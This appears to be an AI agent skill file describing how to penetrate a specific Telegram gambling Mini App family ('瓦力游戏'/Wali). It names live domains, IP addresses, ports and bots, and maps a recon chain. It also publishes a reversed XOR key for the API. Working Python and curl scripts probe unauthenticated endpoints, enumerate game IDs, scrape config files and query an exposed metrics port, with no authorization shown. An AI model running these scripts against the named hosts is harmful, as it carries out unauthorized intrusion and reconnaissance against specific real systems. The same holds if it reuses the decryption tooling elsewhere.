---
name: 太白云生·瓦盘
description: "瓦力游戏(Wali) TG群投/TMA渗透: GCS前端+XOR API+trial.do."
version: 1.0.0
license: MIT
platforms: [linux, macos, windows]
metadata:
    tags: [telegram, tma, wali, gambling, daaixianzun, xor]
    category: daaixianzun
---

> **太白云生**
> 江山如故人未还，一羽千里破云关。
> 师弟二字恩与债，逆流河底鹤难还。

# 瓦力游戏 (Wali) TG 群投/TMA 家族渗透

Use when the target is a **瓦力游戏 (Wali)** Telegram gambling Mini App / bot — 百家乐群投, 快三群投, 体育群投, "官方直营" bots. Third distinct TMA family after Qzino (`telegram-tma-gambling`: `/api.html` AES-CBC+MD5 salt) and yudao (`yudao-appapi-pentest`: REST `/app-api/*` AES-ECB+RSA). This family: **GCS-bucket static frontends + XOR-encrypted Java-style API + unauthenticated trial.do**.

## 1. Family fingerprint
- TG bots: `wltgsh24bot`(per-代理), `waliyouxi0206bot`(main) — title "瓦力游戏，官方直营"; 客服 `@walikefu008`; siblings `wlbjl03bot`(百家乐) `wlbjlhl03bot`(好路投) `wlks003bot`(快三) `wltiyu04bot`(体育).
- TMA frontend: **tg1.game** (34.36.49.112 / 34.111.193.178, same GCS bucket, Vite+Vue SPA, **pure redirect shell**). `config.js` leaks all entry links → t.me bots.
- H5 game platform: **jso31.com** (CloudFront); operator company site `16.162.115.80` / `18.163.128.231` (Next.js, AWS HK, GA G-FE83GMCVJZ).
- Game server cluster: GCP HK openresty multi-port all-403, cert SAN shared across 10+ IPs (internal-LB tell).
- Dead domains (common "源站" the user gives): `fve26.com` (nginx placeholder) / `rxe96.com` (GCS 404).
- FOFA: `title="瓦力游戏"` (~235 hits) clusters into GCS TMA / official site / SEO farms (hb-ccny.com, qyslzj.com, waliyouxi.asia|cam|lol, zq3388w.one, game-wali.com, 17058xx.com).

## 2. Recon chain: dead domain → live asset (reusable technique)
1. User-given origin returns placeholder → **check response headers for static CORS residual**: `access-control-allow-origin: https://www.rxe96.com` present on ALL responses (even 404/405) = nginx `add_header` leftover revealing the **frontend↔API pairing** (rxe96=frontend, fve26=old proxied API).
2. FOFA title search → cluster into asset classes.
3. Grab `tg1.game/config.js` → all bot links.
4. Operator site `16.162.115.80` trial page `/game/trial/trial.html` → inline ajax calls **`/api/app/server/trial.do`** → lobby URL reveals platform domain (jso31.com).
5. tgN.game domain pool: tg1 hits, tg6-9 were unrelated Brazilian casino sites — verify each.

## 3. jso31.com API protocol (XOR crypto, fully reversed)
- Base `/api/app`, POST, header `token: <value>`, Content-Type `application/json; charset=utf-8`.
- **Request body**: `XOR(base64(JSON), key)`; **response**: XOR-encrypted JSON.
- **XOR key hardcoded in frontend** preapi.js/ducky.js: `[47,85,114,120,3,20,9,77,5,90]`.
- **CRITICAL pitfall**: JS uses `new Int8Array(...).map(x => x ^ v[i%10])` = **signed bytes**; Python must convert bytes to signed (`b if b < 128 else b - 256`) before XOR, else decryption yields garbage `Tw\x11\x17gq+w0j...` prefix.
- Endpoints: `account/get/info` `server/types` `server/list` `setting/game` `cfg/all` `banner/list` `activity/list` `notice/announce/list` `game/newGamesList` `game/popularGamesList` `server/check` `server/get` `server/path` `account/update/nickname` `account/update/icon`.
- `setting/game.do` body `{"settingReq":{"keys":["game_ws_url","agent_type","game_hot","activity_url","new_game","server_type_config"]}}` returns WS/agent config.
- Trial uid is auto-increment (9999xxxx, enumerable); trial token is plaintext-base64.

## 4. trial.do mechanism & response discrimination (key logic)
- `GET /api/app/server/trial.do?game=23&from=3` — **no auth**, returns `{"code":0,"url":"https://www.jso31.com/lobby/?uid=X&game=23&token=Y&trial=1&wlang=zh-CN"}`.
- **Trial token only works for lobby play, NOT API auth.** Response tells you which case:
 - No token → XOR ciphertext `{"code":-201,"desc":"账号认证已失效，请关闭游戏后重新登录"}`.
 - **Invalid/trial token → server returns PLAINTEXT** `{"code":500,"msg":"interval server error"}` (unencrypted = strong token-rejected marker).
 - Real tokens are minted by the TG bot betting system → must locate bot backend domain first.
- Frontend reads token via `window.location.href.split("?")` (lobby query params).

## 5. Game servers / WS gateway
- `18.166.132.241`: any HTTP request → **`426 Upgrade Required` + `sec-websocket-version: 13`** = WS service; direct wss all 403 (needs exact handshake params/Origin).
- Game hosts `34.150.63.232`/`34.96.173.127`/`35.220.216.18`: ports 8000-8009, 7000, 7700, 7900, 8890-8891, 9999, 18000, 25010, 29999, 30005, 33222-33223, 33233, 32604... openresty all-403 (needs correct SNI/source IP).
- `20201`/`20202`: **Fluent Bit Prometheus Exporter exposed** → leaks hostname `a04-ip-ssl-hk-new2`.
- `18.162.149.109`: SSH(22) open.

## 6. TG bot auth dead-ends (wltgsh24bot class)
- t.me page has **OPEN APP button but HTML never exposes the webapp URL** (tg://resolve?domain=X&startapp=... deep link; URL resolved only by the TG client).
- web.telegram.org requires login; without bot token no getMe/getWebhookInfo/getMenuButton.
- User-supplied initData needs the real API domain to be testable → **ask the user for the full URL of the first Network request when the Mini App opens** — fastest path to the bot backend.
- Canvas-rendered SPA has no DOM text; use Performance API resource list or inject a fetch interceptor.

## Pitfalls
- Don't burn the fresh initData on recon first (multi-tenant/family lesson from yudao skill): fire the auth call immediately when a fresh initData arrives.
- Same-brand SEO farms are noise; filter by server header (nginx/openresty vs GCS UploadServer).
- XOR 客户端与 Qzino 同族：改 key/path 即可；本库无此外门 `qzino_client.py`，走 Skill `太白云生·微域盘`。

## References
- 个案附件未入库（原 references/wali-game-tg-tma-pentest.md） — full case notes: domains, IPs, ports, endpoints (2026-08).

## 真源

- 手法：`传承/芋府·微域.md`
- 工具：`python3 炼蛊房/yudao_appapi_probe.py --help`

---

## 快速命令集

### XOR 解密工具（Python，正确处理有符号字节）

```python
import base64, json, requests

# XOR key（从 preapi.js/ducky.js 提取）
XOR_KEY = [47, 85, 114, 120, 3, 20, 9, 77, 5, 90]

def xor_crypt(data: bytes) -> bytes:
 """XOR 加解密（处理有符号字节，与 JS Int8Array 一致）"""
 result = []
 for i, b in enumerate(data):
 # JS Int8Array: 有符号字节 (-128 ~ 127)
 signed_b = b if b < 128 else b - 256
 signed_k = XOR_KEY[i % len(XOR_KEY)]
 xored = (signed_b ^ signed_k) & 0xFF
 result.append(xored)
 return bytes(result)

def encrypt_request(payload: dict) -> str:
 """加密请求体"""
 json_bytes = json.dumps(payload, ensure_ascii=False).encode('utf-8')
 encrypted = xor_crypt(base64.b64encode(json_bytes))
 return base64.b64encode(encrypted).decode()

def decrypt_response(resp_b64: str) -> dict:
 """解密响应"""
 encrypted = base64.b64decode(resp_b64)
 decrypted_b64 = xor_crypt(encrypted)
 json_bytes = base64.b64decode(decrypted_b64)
 return json.loads(json_bytes.decode('utf-8'))

BASE_URL = "https://www.jso31.com/api/app"

def api_call(endpoint: str, payload: dict = {}, token: str = None) -> dict:
 """发起 API 请求"""
 headers = {'Content-Type': 'application/json; charset=utf-8'}
 if token:
 headers['token'] = token
 body = encrypt_request(payload)
 resp = requests.post(f"{BASE_URL}/{endpoint}.do",
 data=body, headers=headers,
 verify=False, timeout=15)
 # 检查是否是未加密响应（token rejected）
 try:
 plain = resp.json()
 if plain.get('code') == 500:
 return {'error': 'plaintext_response (token rejected)', 'raw': plain}
 except:
 pass
 return decrypt_response(resp.text)

# 测试：trial.do（无鉴权）
print(requests.get(f"{BASE_URL}/server/trial.do?game=23&from=3",
 verify=False, timeout=15).json())
```

### 未授权接口探测

```bash
# trial.do（获取 lobby URL，无需 token）
curl -sk "https://www.jso31.com/api/app/server/trial.do?game=23&from=3" \
 | python3 -m json.tool

# 尝试其他 game ID
for game in 1 2 3 5 10 23 100; do
 echo -n "game=$game: "
 curl -sk "https://www.jso31.com/api/app/server/trial.do?game=$game&from=3" \
 | python3 -m json.tool | grep -E '"code"|"url"' | head -2
done

# 系统配置（可能无鉴权）
python3 -c "
# 使用上面的 api_call 函数
result = api_call('cfg/all')
print(json.dumps(result, ensure_ascii=False, indent=2)[:500])
"
```

### GCS bucket 探测（tg1.game 前端）

```bash
# config.js 泄露所有 bot 链接
curl -sk https://tg1.game/config.js | python3 -m json.tool 2>/dev/null

# 列出 GCS bucket 内容（若开放）
curl -sk "https://storage.googleapis.com/<bucket-name>/" | python3 -m json.tool 2>/dev/null

# FOFA 搜索同族资产
# FOFA query: title="瓦力游戏" （~235 hits）

# Fluent Bit Prometheus（已知开放）
curl -sk "http://18.162.149.109:20201/metrics" | grep -iE 'hostname|version|uptime' | head -10
```

### 运营商站操作员网站

```bash
# 操作员公司站（Next.js）
curl -sk "http://16.162.115.80/" | grep -iE '<title>|meta name="description"' | head -5

# trial 页面（内联 API 调用泄露平台域名）
curl -sk "http://16.162.115.80/game/trial/trial.html" | grep -oE 'jso31\.com[^"'"'"']*'
```

### 证据写入

```bash
mkdir -p 案卷/<案卷>/wali/
curl -sk "https://www.jso31.com/api/app/server/trial.do?game=23&from=3" \
 > 案卷/<案卷>/wali/trial_unauth.json
curl -sk https://tg1.game/config.js \
 > 案卷/<案卷>/wali/config_js.json
echo "$(date): Wali unauth trial confirmed" >> 案卷/<案卷>/STATUS.md
```
